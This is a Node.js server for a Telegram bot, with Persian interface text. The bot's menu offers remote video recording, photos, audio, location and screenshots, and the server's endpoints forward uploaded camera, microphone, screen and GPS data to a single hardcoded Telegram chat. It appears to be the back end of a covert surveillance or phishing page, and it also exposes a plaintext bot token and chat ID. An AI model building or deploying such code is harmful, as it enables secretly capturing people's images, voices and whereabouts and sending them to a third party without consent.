const { Bot } = require('grammy');
const express = require('express');
const multer = require('multer');
const path = require('path');
const app = express();
const upload = multer();
const port = process.env.PORT || 3000;

const TOKEN = '8448242114:AAGBAU4HN7ipBsmQOpHUID7ceAgtGOXE3Qo';
const CHAT_ID = '6597261815';
const bot = new Bot(TOKEN);
const BOT_API = `https://api.telegram.org/bot${TOKEN}`;

app.use(express.json());
app.use(express.static('public'));

app.post('/webhook', async (req, res) => {
  await bot.handleUpdate(req.body);
  res.send('OK');
});

bot.command('start', async (ctx) => {
  await ctx.reply('قابلیت‌ها آماده!', {
    reply_markup: {
      inline_keyboard: [
        [{ text: '▶️ ویدیو', callback_data: 'start_record' }],
        [{ text: '⏹️ توقف و ارسال', callback_data: 'stop_and_send' }],
        [{ text: '📸 عکس', callback_data: 'take_photo_and_send' }],
        [{ text: '🎤 صدا', callback_data: 'send_audio' }],
        [{ text: '📍 لوکیشن', callback_data: 'send_location' }],
        [{ text: '🖥️ اسکرین‌شات', callback_data: 'take_screenshot' }]
      ]
    }
  });
});

bot.on('callback_query:data', async (ctx) => {
  const data = ctx.callback_query.data;
  ctx.session = ctx.session || {};
  ctx.session.cmd = data;
  await ctx.answerCallbackQuery(`✅ ${data} ارسال شد!`);
  await ctx.reply(`${data} در حال پردازش...`);
});

app.post('/upload_photo', upload.single('photo'), async (req, res) => {
  const photo = req.file;
  if (photo) {
    const apiFormData = new FormData();
    apiFormData.append('chat_id', CHAT_ID);
    apiFormData.append('photo', photo.buffer, photo.originalname);
    apiFormData.append('caption', 'عکس!');
    const response = await fetch(`${BOT_API}/sendPhoto`, { method: 'POST', body: apiFormData });
    const result = await response.json();
    return res.json(result);
  }
  return res.status(400).json({ error: 'عکس نیست' });
});

app.post('/upload', upload.single('video'), async (req, res) => {
  const video = req.file;
  if (video) {
    const apiFormData = new FormData();
    apiFormData.append('chat_id', CHAT_ID);
    apiFormData.append('video', video.buffer, video.originalname);
    apiFormData.append('caption', 'ویدیو!');
    const response = await fetch(`${BOT_API}/sendVideo`, { method: 'POST', body: apiFormData });
    const result = await response.json();
    return res.json(result);
  }
  return res.status(400).json({ error: 'ویدیو نیست' });
});

app.post('/upload_audio', upload.single('audio'), async (req, res) => {
  const audio = req.file;
  if (audio) {
    const apiFormData = new FormData();
    apiFormData.append('chat_id', CHAT_ID);
    apiFormData.append('voice', audio.buffer, audio.originalname);
    apiFormData.append('caption', 'صدا!');
    const response = await fetch(`${BOT_API}/sendVoice`, { method: 'POST', body: apiFormData });
    const result = await response.json();
    return res.json(result);
  }
  return res.status(400).json({ error: 'صدا نیست' });
});

app.post('/send_location', async (req, res) => {
  const { lat, lon } = req.body;
  if (lat && lon) {
    const response = await fetch(`${BOT_API}/sendLocation`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
    });
    const result = await response.json();
    return res.json(result);
  }
  return res.status(400).json({ error: 'لوکیشن نیست' });
});

app.post('/upload_screenshot', upload.single('screenshot'), async (req, res) => {
  const screenshot = req.file;
  if (screenshot) {
    const apiFormData = new FormData();
    apiFormData.append('chat_id', CHAT_ID);
    apiFormData.append('photo', screenshot.buffer, screenshot.originalname);
    apiFormData.append('caption', 'اسکرین‌شات!');
    const response = await fetch(`${BOT_API}/sendPhoto`, { method: 'POST', body: apiFormData });
    const result = await response.json();
    return res.json(result);
  }
  return res.status(400).json({ error: 'اسکرین‌شات نیست' });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public/index.html'));
});

app.get('/setup', async (req, res) => {
  const webhookUrl = `https://your-vercel-app.vercel.app/webhook`;
  const response = await fetch(`${BOT_API}/setWebhook?url=${webhookUrl}`);
  const result = await response.json();
  res.json(result);
});

app.listen(port, () => {
  console.log(`Server running at http://localhost:${port}`);
});

bot.start();
